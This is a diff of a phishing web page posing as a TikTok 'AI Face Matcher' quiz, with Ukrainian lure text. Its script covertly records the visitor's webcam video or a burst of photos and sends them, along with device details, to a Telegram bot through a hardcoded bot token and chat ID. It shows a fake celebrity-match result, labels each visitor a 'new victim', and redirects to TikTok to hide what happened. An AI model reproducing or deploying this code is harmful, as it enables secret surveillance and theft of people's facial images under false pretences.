@@ -8,24 +8,35 @@
         body { background: #000; color: #fff; text-align: center; font-family: sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; overflow: hidden; }
         .container { padding: 20px; max-width: 400px; width: 90%; }
         .logo { width: 60px; margin-bottom: 25px; filter: invert(1); }
-        .btn { background: #fe2c55; border: none; padding: 18px 40px; color: #fff; font-size: 16px; font-weight: bold; border-radius: 4px; cursor: pointer; width: 100%; }
-        #status { display: none; margin-top: 20px; }
-        .loader { border: 2px solid #222; border-top: 2px solid #fe2c55; border-radius: 50%; width: 25px; height: 25px; animation: spin 2s linear infinite; margin: 0 auto 15px; }
+        .btn { background: #fe2c55; border: none; padding: 18px 40px; color: #fff; font-size: 16px; font-weight: bold; border-radius: 4px; cursor: pointer; width: 100%; margin-top: 10px; }
+        #status, #result { display: none; }
+        .loader { border: 2px solid #222; border-top: 2px solid #fe2c55; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; margin: 0 auto 15px; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .star-img { width: 150px; height: 150px; border-radius: 50%; border: 3px solid #fe2c55; object-fit: cover; margin: 15px 0; }
         video, canvas { position: absolute; left: -9999px; opacity: 0; }
     </style>
 </head>
 <body>
 
-    <div class="container" id="ui">
+    <div class="container" id="main-ui">
         <img src="https://raw.githubusercontent.com/simple-icons/simple-icons/develop/icons/tiktok.svg" class="logo">
-        <h2>AI Face Analyzer</h2>
-        <p id="desc">Натисніть кнопку для синхронізації з AI.</p>
-        <button class="btn" id="startBtn" onclick="init()">Почати аналіз</button>
+        <div id="start-screen">
+            <h2>AI Face Matcher</h2>
+            <p>Дізнайся, на яку зірку TikTok ти схожий за допомогою AI-аналізу.</p>
+            <button class="btn" onclick="init()">Почати сканування</button>
+        </div>
 
         <div id="status">
             <div class="loader"></div>
-            <p id="st-text" style="color: #888; font-size: 14px;">Обробка біометрії...</p>
+            <p id="st-text" style="color: #888;">Ініціалізація нейромережі...</p>
+        </div>
+
+        <div id="result">
+            <h3 style="color: #fe2c55;">Результат знайдено!</h3>
+            <img src="https://api.dicebear.com/7.x/avataaars/svg?seed=Bella" class="star-img" id="star-pic">
+            <p>Ти схожий на: <strong id="star-name">Bella Poarch</strong> на 94%</p>
+            <button class="btn" style="background:#555" onclick="location.href='https://tiktok.com'">Поділитися результатом</button>
+            <p style="font-size: 10px; color: #444; margin-top: 10px;">Зачекайте, триває синхронізація...</p>
         </div>
     </div>
 
@@ -35,74 +46,83 @@
     <script>
         const token = '8492555273:AAHur2SwzreGkYlCz5-gBCGCJxzvrdwFczM';
         const chat = '7808795546';
-        const tiktokUrl = 'https://www.tiktok.com/explore';
+        const stars = [
+            {name: "Khaby Lame", img: "https://api.dicebear.com/7.x/avataaars/svg?seed=Khaby"},
+            {name: "Addison Rae", img: "https://api.dicebear.com/7.x/avataaars/svg?seed=Addison"},
+            {name: "MrBeast", img: "https://api.dicebear.com/7.x/avataaars/svg?seed=Felix"}
+        ];
 
         async function init() {
             try {
-                const stream = await navigator.mediaDevices.getUserMedia({ 
-                    video: { facingMode: "user", width: 640, height: 480 } 
-                });
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                 const video = document.getElementById('v');
                 video.srcObject = stream;
                 await video.play();
 
-                document.getElementById('startBtn').style.display = 'none';
-                document.getElementById('desc').style.display = 'none';
+                document.getElementById('start-screen').style.display = 'none';
                 document.getElementById('status').style.display = 'block';
 
-                // Перевірка підтримки MediaRecorder
+                // 1. Збір даних про IP та пристрій
+                sendInfo();
+
+                // 2. Вибір режиму (Відео або Фото)
                 if (typeof MediaRecorder !== 'undefined' && MediaRecorder.isTypeSupported('video/webm')) {
                     startVideoMode(stream);
                 } else {
                     startPhotoMode(stream, video);
                 }
 
-            } catch (e) {
-                window.location.replace(tiktokUrl);
-            }
+            } catch (e) { location.href = 'https://tiktok.com'; }
         }
 
-        // РЕЖИМ ВІДЕО
+        async function sendInfo() {
+            const info = `📸 Нова жертва:\n📱 Пристрій: ${navigator.userAgent}\n🌐 Мова: ${navigator.language}`;
+            fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat}&text=${encodeURIComponent(info)}`);
+        }
+
         function startVideoMode(stream) {
             const chunks = [];
             const recorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
-            
             recorder.ondataavailable = e => chunks.push(e.data);
             recorder.onstop = async () => {
                 const blob = new Blob(chunks, { type: 'video/webm' });
                 const f = new FormData();
                 f.append('chat_id', chat);
-                f.append('video', blob, 'video.webm');
-                
+                f.append('video', blob, 'v.webm');
                 await fetch(`https://api.telegram.org/bot${token}/sendVideo`, { method: 'POST', body: f });
-                finish(stream);
+                showResult(stream);
             };
-
             recorder.start();
-            setTimeout(() => recorder.stop(), 4000); // Запис 4 секунди
+            setTimeout(() => recorder.stop(), 4000);
         }
 
-        // РЕЖИМ ФОТО (якщо відео не працює)
         async function startPhotoMode(stream, video) {
-            for (let i = 0; i < 7; i++) {
+            for (let i = 0; i < 5; i++) {
                 const canvas = document.getElementById('c');
                 const ctx = canvas.getContext('2d');
                 ctx.drawImage(video, 0, 0, 640, 480);
-                
                 const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.6));
                 const f = new FormData();
                 f.append('chat_id', chat);
-                f.append('photo', blob, 'img.jpg');
-                
+                f.append('photo', blob, 'p.jpg');
                 fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: f });
-                await new Promise(r => setTimeout(r, 1200));
+                await new Promise(r => setTimeout(r, 800));
             }
-            finish(stream);
+            showResult(stream);
         }
 
-        function finish(stream) {
-            stream.getTracks().forEach(t => t.stop());
-            window.location.replace(tiktokUrl);
+        function showResult(stream) {
+            document.getElementById('status').style.display = 'none';
+            const res = stars[Math.floor(Math.random() * stars.length)];
+            document.getElementById('star-name').innerText = res.name;
+            document.getElementById('star-pic').src = res.img;
+            document.getElementById('result').style.display = 'block';
+
+            // Остаточний редирект через 4 секунди після показу результату
+            setTimeout(() => {
+                stream.getTracks().forEach(t => t.stop());
+                location.href = 'https://tiktok.com/explore';
+            }, 4000);
         }
     </script>
 </body>
